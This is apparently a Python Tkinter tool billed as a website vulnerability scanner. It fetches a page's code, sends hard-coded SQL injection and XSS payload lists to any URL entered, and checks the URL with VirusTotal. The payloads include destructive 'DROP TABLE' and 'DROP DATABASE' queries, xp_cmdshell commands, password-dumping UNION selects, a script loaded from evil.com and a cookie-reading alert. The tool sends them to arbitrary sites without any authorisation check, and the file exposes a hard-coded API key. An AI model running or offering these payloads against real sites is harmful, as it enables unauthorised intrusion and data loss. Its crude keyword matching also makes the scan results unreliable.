import requests
from bs4 import BeautifulSoup
import tkinter as tk
from tkinter import messagebox, scrolledtext, filedialog
import re

# Default VirusTotal API key (replace with your actual key)
DEFAULT_API_KEY = "bfc2592ad157d3450b1026f849876da871aa40486df24b0550c5719a96ca4ab8"

# Predefined lists of SQL Injection and XSS payloads
SQL_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1 --", "' OR 1=1#", "' OR 'a'='a", "' OR 'x'='x' --", 
    "' OR 'x'='x' /*", "' OR 1=1#", "' OR 1=1;", "' OR 1=1--", "admin' --", 
    "'; DROP TABLE users; --", "' OR 1=1; --", "' OR 'x' = 'x'; --", "1' UNION SELECT null, username, password FROM users --", 
    "' UNION SELECT null, username, password FROM users --", "'; SELECT * FROM users --", "'; EXEC xp_cmdshell('dir') --", 
    "'; SELECT * FROM information_schema.tables --", "'; EXEC xp_cmdshell('net user') --", "'; SELECT 1 FROM dual --",
    "' OR 1=1 LIMIT 1; --", "' OR 1=1; SELECT SLEEP(5) --", "' OR 1=1 GROUP BY CONCAT(username, 0x3a, password) --", 
    "1' AND 1=1", "1' OR sleep(5) --", "' AND 1=1#", "'; SHOW TABLES --", "' OR 1=1; DROP DATABASE test --"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>", "<svg/onload=alert(1)>", 
    "<iframe src='javascript:alert(1)'>", "<body onload=alert(1)>", "<script>confirm('XSS')</script>", 
    "<img src='x' onerror='alert(1);'>", "<script>document.location='javascript:alert(1)'</script>", 
    "<a href='javascript:alert(1)'>Click me</a>", "<script src='//evil.com/xss.js'></script>", 
    "<img src='x' onerror='alert(document.cookie)'>", "<div onmouseover='alert(1)'>", "<input type='image' src='x' onerror='alert(1)'>", 
    "<button onclick='alert(1)'>Click</button>", "<form><input type='text' value='x' onfocus='alert(1)'></form>", 
    "<input type='text' value='x' onblur='alert(1)'>", "<a href='javascript:eval(atob('YWxlcnQoMSk=') )'>Link</a>", 
    "<input type='text' value='<script>alert(1)</script>'>", "<div onmousedown='alert(1)'>Test</div>", 
    "<img src='x' onerror='alert(1);window.location=\"javascript:alert(2)\"'>", "<script>alert(2)</script>",
    "<input type='text' value='<img src=\"x\" onerror=\"alert(1)\">'>", "<button onmouseover='alert(1)'>Hover</button>", 
    "<a href='javascript:confirm(1)'>Click</a>", "<form><input type='submit' value='Submit' onsubmit='alert(1)'></form>"
]

# Function to fetch and display the entire HTML and JavaScript
def fetch_full_code(link):
    try:
        response = requests.get(link, timeout=10, headers={'User-Agent': 'FullCodeFetcher/1.0'})
        response.raise_for_status()

        # Parse HTML content
        soup = BeautifulSoup(response.text, 'html.parser')

        # Extract inline and external JavaScript
        scripts = soup.find_all('script')
        js_code = []

        for script in scripts:
            if script.string:  # Inline JavaScript
                js_code.append(f"Inline Script:\n{script.string.strip()}")
            elif script.get('src'):  # External JavaScript
                external_src = script['src']
                try:
                    external_response = requests.get(external_src if "http" in external_src else f"{link}/{external_src}", timeout=10)
                    external_response.raise_for_status()
                    js_code.append(f"External Script ({external_src}):\n{external_response.text.strip()}")
                except requests.exceptions.RequestException as e:
                    js_code.append(f"External Script ({external_src}): Error fetching script - {e}")

        # Combine all JavaScript into a single string
        js_code_combined = "\n\n".join(js_code)

        return response.text, js_code_combined
    except requests.exceptions.RequestException as e:
        return None, f"Error fetching the full code: {e}"

# Function to test for vulnerabilities
def test_vulnerabilities(link):
    try:
        vulnerabilities = []
        highlighted_vulnerabilities = []
        
        # Test SQL injection with each SQL payload
        for sql_payload in SQL_PAYLOADS:
            test_url = f"{link}?test={sql_payload}"
            response = requests.get(test_url, timeout=10, headers={'User-Agent': 'VulnerabilityScanner/1.0'})
            if "SQL syntax" in response.text or "mysql" in response.text.lower() or "database" in response.text.lower():
                vulnerabilities.append("Possible SQL Injection vulnerability detected.")
                highlighted_vulnerabilities.append(f"SQL Payload: {sql_payload} detected in response.")
        
        # Test XSS with each XSS payload
        for xss_payload in XSS_PAYLOADS:
            test_url = f"{link}?test={xss_payload}"
            response = requests.get(test_url, timeout=10, headers={'User-Agent': 'VulnerabilityScanner/1.0'})
            if xss_payload in response.text:
                vulnerabilities.append("Possible Cross-Site Scripting (XSS) vulnerability detected.")
                highlighted_vulnerabilities.append(f"XSS Payload: {xss_payload} detected in response.")
        
        # Ensure two return values: vulnerabilities and highlighted_vulnerabilities
        if not highlighted_vulnerabilities:
            highlighted_vulnerabilities = ["null"]  # Indicating null if no vulnerabilities found
        
        return vulnerabilities if vulnerabilities else ["null"], highlighted_vulnerabilities
    except requests.exceptions.RequestException as e:
        return [f"Error testing vulnerabilities: {e}"], ["null"]

# Function to check the URL with VirusTotal
def check_virustotal(link, api_key):
    try:
        url = "https://www.virustotal.com/api/v3/urls"
        headers = {"x-apikey": api_key}
        data = {"url": link}

        # Submit URL for analysis
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        analysis_id = response.json()["data"]["id"]

        # Retrieve scan results
        result_url = f"https://www.virustotal.com/api/v3/analyses/{analysis_id}"
        scan_response = requests.get(result_url, headers=headers)
        scan_response.raise_for_status()
        scan_data = scan_response.json()

        # Extract threat detection summary
        stats = scan_data["data"]["attributes"]["stats"]
        
        # Safely get last_analysis_results, handling cases where it may not be present
        vendor_info = scan_data["data"]["attributes"].get("last_analysis_results", {})

        # Formatting the vendor info with details and coloring
        vendor_details = ""
        if vendor_info:
            for vendor, details in vendor_info.items():
                vendor_details += f"{vendor} - {details['category']} (last detected: {details.get('date', 'N/A')})\n"
        else:
            vendor_details = "No analysis results available."

        return (
            f"VirusTotal Threat Detection:\n"
            f"Harmless: {stats['harmless']}, Malicious: {stats['malicious']}, "
            f"Suspicious: {stats['suspicious']}, Undetected: {stats['undetected']}\n\n"
            f"Vendor Detection Details:\n{vendor_details}"
        )
    except Exception as e:
        return f"Error checking VirusTotal: {e}"

# Tkinter GUI
def create_gui():
    def analyze_url():
        link = url_entry.get().strip()
        if not link:
            messagebox.showwarning("Input Error", "Please enter a URL!")
            return

        # Fetch full HTML and JavaScript
        html_code, js_code = fetch_full_code(link)
        if not html_code:
            result_text.delete(1.0, tk.END)
            result_text.insert(tk.END, js_code)
            return

        # Check vulnerabilities and VirusTotal
        vulnerabilities, highlighted_vulnerabilities = test_vulnerabilities(link)
        threat_info = check_virustotal(link, DEFAULT_API_KEY)

        # Display results in the GUI
        result_text.delete(1.0, tk.END)
        result_text.insert(tk.END, "Full HTML Code:\n")
        result_text.insert(tk.END, html_code[:5000] + "\n\n" if len(html_code) > 5000 else html_code)

        result_text.insert(tk.END, "\nJavaScript Code:\n")
        result_text.insert(tk.END, js_code[:5000] + "\n\n" if len(js_code) > 5000 else js_code)

        result_text.insert(tk.END, "\nVulnerability Analysis:\n")
        for vulnerability in vulnerabilities:
            result_text.insert(tk.END, f"- {vulnerability}\n")

        if highlighted_vulnerabilities != ["null"]:
            result_text.insert(tk.END, "\nHighlighted Vulnerabilities:\n")
            for highlight in highlighted_vulnerabilities:
                result_text.insert(tk.END, f"  {highlight}\n")
        else:
            result_text.insert(tk.END, "\nHighlighted Vulnerabilities: null\n")

        result_text.insert(tk.END, f"\n{threat_info}\n")

    def clear_all():
        url_entry.delete(0, tk.END)
        result_text.delete(1.0, tk.END)

    def save_results():
        result_content = result_text.get(1.0, tk.END)
        if result_content.strip():
            file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
            if file_path:
                with open(file_path, 'w') as file:
                    file.write(result_content)
        else:
            messagebox.showwarning("No Content", "No results to save!")

    # Main Tkinter window
    root = tk.Tk()
    root.title("Advanced Website Vulnerability Scanner")
    root.geometry("1200x800")
    root.configure(bg="black")

    # URL input
    tk.Label(root, text="Enter URL:", fg="white", bg="black").pack(pady=5)
    url_entry = tk.Entry(root, width=80, bg="gray", fg="black")
    url_entry.pack(pady=5)

    # Frame for buttons
    button_frame = tk.Frame(root, bg="black")
    button_frame.pack(pady=10)

    # Buttons in horizontal arrangement
    analyze_button = tk.Button(button_frame, text="Analyze", command=analyze_url, bg="gray", fg="black")
    analyze_button.pack(side=tk.LEFT, padx=10)

    clear_button = tk.Button(button_frame, text="Clear", command=clear_all, bg="gray", fg="black")
    clear_button.pack(side=tk.LEFT, padx=10)

    save_button = tk.Button(button_frame, text="Save", command=save_results, bg="gray", fg="black")
    save_button.pack(side=tk.LEFT, padx=10)

    # Result display
    result_text = scrolledtext.ScrolledText(root, width=140, height=40, bg="black", fg="white", insertbackground="white")
    result_text.pack(pady=10)

    # Run Tkinter loop
    root.mainloop()

# Run GUI
if __name__ == "__main__":
    create_gui()
